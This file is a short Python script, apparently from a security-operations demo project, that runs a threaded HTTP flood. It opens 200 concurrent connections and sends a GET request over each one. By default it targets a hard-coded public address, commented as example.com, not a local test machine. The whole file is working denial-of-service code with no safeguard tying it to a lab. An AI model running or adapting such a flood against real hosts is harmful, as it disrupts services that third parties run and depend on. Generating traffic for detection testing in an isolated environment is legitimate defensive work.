import threading
import socket
import time
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import get_logger

log = get_logger(__name__)

def run(target_ip="93.184.215.14", target_port=80, requests=200): # example.com
    print("\n=======================================================")
    print("   AI-SOC Demo: HTTP DDoS Flood Attack")
    print("=======================================================\n")
    log.warning(f"🔴 [ATTACK] Launching HTTP Flood against {target_ip}:{target_port} ({requests} requests)...")
    
    def send_req():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                s.connect((target_ip, target_port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        except (socket.timeout, ConnectionRefusedError):
            pass

    threads = []
    for _ in range(requests):
        t = threading.Thread(target=send_req)
        threads.append(t)
        t.start()
        time.sleep(0.005)

    for t in threads:
        t.join()
        
    log.info("✅ HTTP Flood simulation complete.")

if __name__ == "__main__":
    run()
